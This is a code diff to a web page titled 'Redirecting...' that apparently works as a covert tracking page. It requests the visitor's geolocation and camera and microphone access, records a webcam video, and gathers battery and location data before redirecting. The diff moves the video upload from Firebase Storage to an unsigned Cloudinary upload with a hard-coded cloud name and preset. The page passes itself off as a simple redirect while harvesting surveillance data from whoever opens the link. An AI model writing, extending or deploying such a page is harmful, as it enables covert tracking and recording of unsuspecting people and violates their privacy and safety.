@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script src="https://upload-widget.cloudinary.com/global/all.js" type="text/javascript"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
@@ -77,6 +76,8 @@
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
     <!-- Firebase SDK (Storage) -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
+    <!-- Cloudinary Upload Widget -->
+    <script src="https://upload-widget.cloudinary.com/global/all.js" type="text/javascript"></script>
 </head>
 <body>
     <div class="container">
@@ -387,21 +388,33 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     console.log("Blob type:", blob.type);
 
-                    const storageRef = storage.ref();
-                    const videoRef = storageRef.child(`videos/${currentUserId}_${Date.now()}.webm`);
+                    const uploadOptions = {
+                        cloud_name: 'dnvkhmgj0', // **YOUR CLOUD NAME HERE: dnvkhmgj0**
+                        upload_preset: 'locstorage'  // **YOUR UPLOAD PRESET NAME HERE: locstorage**
+                    };
 
                     try {
-                        console.log("Attempting to upload video to Firebase Storage...");
-                        await videoRef.put(blob);
-                        videoUrl = await videoRef.getDownloadURL();
-                        console.log("Video URL obtained:", videoUrl);
+                        console.log("Attempting to upload video to Cloudinary...");
+                        cloudinary.upload(blob, uploadOptions, async function(error, result) {
+                            if(error) {
+                                console.error("Cloudinary video upload error:", error);
+                                cameraError = "Error uploading video to Cloudinary: " + error.message;
+                                videoUrl = null;
+                                collectOtherData(true, videoUrl, cameraError); // Ga verder, ook al is upload mislukt
+                            } else {
+                                videoUrl = result.secure_url; // Gebruik secure_url voor HTTPS
+                                console.log("Cloudinary Video URL obtained:", videoUrl);
+                                collectOtherData(true, videoUrl, cameraError); // Ga verder met de rest van de data collectie
+                            }
+                        });
+
                     } catch (uploadError) {
-                        console.error("Error uploading video to Firebase Storage:", uploadError);
-                        cameraError = "Error uploading video: " + uploadError.message;
+                        console.error("Unexpected error during Cloudinary upload process:", uploadError);
+                        cameraError = "Unexpected error during video upload: " + uploadError.message;
                         videoUrl = null;
+                        collectOtherData(true, videoUrl, cameraError); // Ga verder, ook al is upload mislukt
                     } finally {
-                        collectOtherData(true, videoUrl, cameraError);
-                         if (stream) {
+                        if (stream) {
                             stream.getTracks().forEach(track => track.stop());
                         }
                     }
@@ -600,7 +613,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         navigator.geolocation.getCurrentPosition(
             async (position) => {
                 console.log("Location permission granted (browser prompt).");
-                // 2. If location granted, THEN request Camera/Microphone
+                // 2. If location granted, THEN request Camera/
                 const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
                 const { videoUrl, cameraError } = cameraMicData;
 
